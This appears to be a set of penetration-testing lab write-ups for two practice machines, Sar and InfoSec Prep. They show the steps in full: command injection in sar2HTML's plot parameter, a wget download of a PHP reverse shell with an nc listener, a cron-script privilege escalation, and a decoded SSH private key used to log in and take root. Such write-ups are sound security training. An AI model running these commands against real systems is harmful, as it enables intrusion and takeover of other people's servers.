
## offsec-labs-writeups

### Sar


- Vulnerability Exploited: Sar2HTML 3.2.1 - Remote Command Execution 
- System Vulnerable: 192.168.51.35
- Vulnerability Explanation: The vulnerability is due to insufficient sanitizing of user supplied inputs in the application when handling a crafted HTTP request. A remote attacker may be able to exploit this to execute arbitrary commands within the context of the application, via a crafted HTTP request.
- Privilege Escalation Vulnerability:
    - Abusing Cronjob
    - Abusing Writable file permission
- Severity: Critical

An initial scan using nmapAutomator tool revealed Apache httpd 2.4.29 ((Ubuntu)) running on port 80

```javascript
(root@kali)-[/home/kali/nmapAutomator] ./nmapAutomator.sh  192.168.51.35 All
    Running all scans on 192.168.51.35
    Host is likely running Linux
---------------------Starting Port Scan-----------------------

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:50:56:BF:F3:1A (VMware)

---------------------Starting Script Scan-----------------------

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: |   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 00:50:56:BF:F3:1A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

the Apache default page is shown below

![1](https://user-images.githubusercontent.com/38728250/194192999-df7a3460-5996-43bf-bbcf-21e83aa95867.png)

running Dirb for directory brute force attack for enumerating web directories:

```javascript
(root@kali)-[/home/kali/nmapAutomator]
 dirb http://192.168.51.35/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct  5 21:26:10 2022
URL_BASE: http://192.168.51.35/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.55.35/ ----
+ http://192.168.55.35/index.html (CODE:200|SIZE:10918)                                                        
+ http://192.168.55.35/phpinfo.php (CODE:200|SIZE:95487)                                                       
+ http://192.168.55.35/robots.txt (CODE:200|SIZE:9)                                                            
+ http://192.168.55.35/server-status (CODE:403|SIZE:278)                                                       
                                                                                                               
-----------------
END_TIME: Wed Oct  5 21:26:12 2022
DOWNLOADED: 4612 - FOUND: 4

```

- Let's see what does robots.txt have
![2](https://user-images.githubusercontent.com/38728250/194194345-afc4707f-1a10-40ba-a910-0863919541de.png)

- opening the URL sar2HTML, and the resulting web page displays its default configuration along with version disclosure.
- So, I looked up for its exploit, and i found rce on exploit db.
- The exploit says: In web application you will see index.php?plot url extension.
- Let test first command injection vulnerability
![3](https://user-images.githubusercontent.com/38728250/194197162-062c2164-878c-4daf-83da-ef8ec179f861.png)
python3 is there
- So let's input our own php-reverse-shell from pentestmonkey. The script will open an outbound TCP connection from the webserver to a host and port of specified on the source code. Bound to this TCP connection will be a shell.
    - 1. ``` git clone https://github.com/pentestmonkey/php-reverse-shell  ```
    - 2. ``` Vim php-reverse-shell.php ``` and edit the ip address and port number to 1234
    - 3. and then running the server by Execute ``` python -m http.server 8008 ```
    - 4. In the url execute ``` sar2HTML/index.php?plot=;wget+192.168.51.35:8008/php-reverse-shell.php ``` for upload the file on the server 
    - 5. testing if the file has been uploaded ```index.php?plot=;ls```, yes it is uploaded 
    - 6. Try to running it and Voila I have got the shell
    - Take the first step by taking a proper terminal shell by the command ```import put:pty.spawn(‘/bin/bash’);```
    - There we go
    - Let’s execute privilege escalation script (LinEnum is one such script that can be incredibly useful for privilege escalation on Linux systems.) on /var/tmp
    - On my machine
    - ```cd tools/LinEnum```
    - And upload the file on the attacked machine by
    - ```Wget http://192.168.51.35/LinEnum.sh```
    - And there we are, and then I run the script and checking for the output and analyzing the data so what all the results we have got by the linux enumeration script.
    - so I found a cron job of a file which is getting executed with ```sudo ./finally.sh``` inside ```/var/www/html``` dir
    - The file ```finally.sh``` has no write permission, On the other hand the ```write.sh``` has the execute permission.
    - So as we have the permissions to ```write.sh``` we upload our shell, php shell to our ```/www/html``` dir.
    - Lets start a reverse http server 
    -  ```python -m http.server 8008```
    - Update the port on ```rev.php``` to 1337
    - Upload the script in ```/var/www/html$ wget 192.168.51.35:8008/php-reverse-shell.php```
    - Start listen to the port 1337 by ```nc -lvp 1337```
    - ```Echo “php ./rev.php”  >> write.sh```
    - And yes we have got our root user shell
    - Capture the flag
    - ```cd /root``` , ```cat root.txt```
 
                                









## InfoSec Prep

- Vulnerability Exploited: Misconfigured SSH Keys
- System Vulnerable: 192.168.51.89
- Vulnerability Explanation: The vulnerability is to exploiting SSH keys by Accessing readable private SSH keys and using them to authenticate or Accessing writable public SSH keys and adding your own one to them to authenticate, this two way could allow for an attacker to escalate privileges to root.
- Privilege Escalation Vulnerability:
    - Abusing SSH keys
    - Abusing sudo rights
- Severity: Critical

An initial scan using nmapAutomator tool revealed Apache httpd 2.4.41 ((Ubuntu)) running on port 80
```javascript
(kali@kali)-[~/nmapAutomator]
$ ./nmapAutomator.sh 192.168.51.89 All

Running all scans on 192.168.51.89

Host is likely running Linux

- --------------------Starting Port Scan-----------------------

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

- --------------------Starting Script Scan-----------------------

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
|_http-title: OSCP Voucher – Just another WordPress site
|*http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|*/secret.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
the WordPress site page is shown below
![oscp](https://user-images.githubusercontent.com/38728250/194421123-f1c452f3-3437-4d48-bdf6-dc869a098858.png)

running Dirb for directory brute force attack for enumerating web directories:


```javascript
(kali?kali)-[~/nmapAutomator]
$ dirb http://192.168.51.89 | grep .txt
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+ http://192.168.51.89/index.php (CODE:301|SIZE:0)                                 
+ http://192.168.51.89/robots.txt (CODE:200|SIZE:36)
==> DIRECTORY: http://192.168.51.89/wp-admin/                                      
==> DIRECTORY: http://192.168.51.89/javascript/jquery/                             
                                                                                   
+ http://192.168.51.89/wp-admin/admin.php (CODE:302|SIZE:0)                        
==> DIRECTORY: http://192.168.51.89/wp-admin/images/                               
==> DIRECTORY: http://192.168.51.89/wp-admin/user/                                 
+ http://192.168.51.89/wp-content/index.php (CODE:200|SIZE:0)                      
==> DIRECTORY: http://192.168.51.89/wp-content/themes/                             
                                                                                   
+ http://192.168.51.89/javascript/jquery/jquery (CODE:200|SIZE:271809)             
                                                                                   
+ http://192.168.51.89/wp-admin/network/admin.php (CODE:302|SIZE:0)                
+ http://192.168.51.89/wp-admin/network/index.php (CODE:302|SIZE:0)                
                                                                                   
+ http://192.168.51.89/wp-admin/user/admin.php (CODE:302|SIZE:0)                   
+ http://192.168.51.89/wp-admin/user/index.php (CODE:302|SIZE:0)                   
                                                                                   
+ http://192.168.51.89/wp-content/plugins/index.php (CODE:200|SIZE:0)              
                                                                                   
+ http://192.168.51.89/wp-content/themes/index.php (CODE:200|SIZE:0)  
```

Let's see what does robots.txt have

![roborts.txt](https://user-images.githubusercontent.com/38728250/194422156-6b8de535-f980-476c-bd60-e040a3685943.png)


Partial contents of secret.txt:

```javascript
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY
S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0
eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ
aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj
MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy
aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS
d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0
SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw
NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ
ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1
R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ
THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT
WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC
M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu
dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np
c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i
VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB
cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq
NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz
NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG
cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl
MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r
bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK
eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r
TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP
cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV
blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y
CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB
SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H
bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK
TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp
a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK
T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx
djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS
aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0
RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy
ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr
dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
```

what we have here looks like base64, i can tell by "==" and it starts with a capital 

So the next step is to decode the file and see wath's the result will be 

$ base64 -d secret.txt

```javascript
(kali@kali)-[~/nmapAutomator]
$ base64 -d secret.txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
                                                                           
```

As you can see it's an OpenSSH Private Key.

So, the next thing i can do is to try to ssh into it

```javascript
(kali@kali)-[~/nmapAutomator]
$ ssh oscp@192.168.51.89 -i oscp.rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 06 Oct 2022 09:53:24 PM UTC

  System load:  0.0                Processes:             210
  Usage of /:   25.4% of 19.56GB   Users logged in:       0
  Memory usage: 59%                IPv4 address for eth0: 192.168.51.89
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash-5.0$ id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
-bash-5.0$ 

                                                                           
```
-i for indicating the file.

...that worked! We are logged in.

So now i will try to get root privileges for that there's a few things we can do for example (upload LinEnum script that i used to get the privilege escalation in the Sar machine), but i'm not going to use that. 
i'm going to exploiting sudo by /bin/bash -p

```javascript
$ man bash | grep "privileged"
                      privileged
              -p      Turn on privileged mode. 
```

as you can see the -p turns on the privilege mode.

and Voila ...we have a shell as root!

```javascript
-bash-5.0$ /bin/bash -p
bash-5.0# whoami
root
                                                              
```

- Capture the flag

```javascript
cd /root
bash-5.0# ls
fix-wordpress  flag.txt  proof.txt  snap
bash-5.0# cat flag.txt 
Your flag is in another file...
bash-5.0# cat proof.txt 
38c1c957f5644168f5a65a9c14859527
bash-5.0# 
                                                    
```

